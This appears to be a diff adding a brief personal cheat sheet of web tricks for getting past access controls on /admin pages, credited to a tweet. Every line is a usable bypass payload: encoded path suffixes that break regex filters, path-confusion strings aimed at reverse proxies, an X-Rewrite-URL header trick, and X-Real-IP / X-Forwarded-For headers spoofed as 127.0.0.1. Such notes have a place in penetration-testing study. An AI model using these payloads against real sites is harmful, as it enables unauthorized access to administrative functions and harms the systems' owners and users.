@@ -1,0 +1,7 @@
+Trying to put together a collection of hack tricks I find in my readings. 
+Bypass auto to /admin (credit: https://twitter.com/hackerscrolls/status/1254701239360720900)
+/admin%20 or /admin%09  break a regex
+/admin/::;/ or /static../admin.jsp  is there are some reverse proxies
+Send request to /index.html with X-Rewrite-URL: /admin    May redefine URL request
+Send request to /admin with X-Real-IP: 127.0.0.1  and X-Forward-For: 127.0.0.1  if admin page is accessable localhost. 
+
